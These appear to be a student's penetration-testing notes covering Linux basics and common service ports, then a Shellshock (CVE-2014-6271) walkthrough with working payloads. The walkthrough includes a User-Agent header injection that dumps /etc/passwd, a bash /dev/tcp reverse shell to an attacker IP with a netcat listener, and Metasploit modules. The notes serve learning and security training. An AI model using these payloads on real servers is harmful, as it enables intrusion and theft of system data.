## Overview of Linux
- An open-source OS comprised of a linux kernel (developed by Linus torvalds) and a GNU toolkit (a collection of software and utilities developed by Richard Stallman)
- commonly referred to as GNU/Linux
- various distributions exist for various uses (distros have the same OS but diff desktop envs)
- Most used for servers

Egs:
Ubuntu -> general use
Kali -> security research (debian based)
Debian -> random stuff servers etc

Common Services:
- Apache Web server -p80/443  --> webserver like MIS,Nginx etc.  (443 if ssl configured)
- SSH -p22  --> succeser to telnet
- FTP -p21 --> usually exists with a webserver to transfer files
- SAMBA -p445  --> SMBs implemented for linux (for shares etc)

# Exploiting linux vulns

## Shellshock CVE-2014-6271
- Bash vuln most prevalent in past years
- involves apache and bash
- Family of vulns that affect bash aft ver 1.3 to allow RCE to obtain a bashshell

- Attacker runs a CGI script or .sh script on the target apache server to show output on the web interface

About bash:
- bash is a nix shell part of GNU and default for most linux distros

demo:
Run nmap to see if cgi used by server is vuln to shellshock
```bash
nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"
```

Replace user agent header of get request used by the cgi with this (spacing impt):

User-agent:  () {  :;  }; echo; echo; /bin/bash -c 'cat /etc/passwd'

- Res given by server will be the executed code (gives a list of all user acts from above code)

Reverse shell:
- On attackers system:
	nc -lvnp 1234

- In burpsuite edit the CGI get request 
User-agent:  () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/(attackersIP)/1234 0>&1'

- -i>& redirects input from attacker to server
- 0>&1 redirects output to the listener on attacker machine

Check the linux distro used:
```bash
cat etc/*issue*

#kernal information
uname -a
```

MSF method for shellshock:
```msfconsole
#auxiliary module
use auxiliary/scanner/http/apache_mod_cgi_bash_env

#exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set targeturi /gettime.cgi

```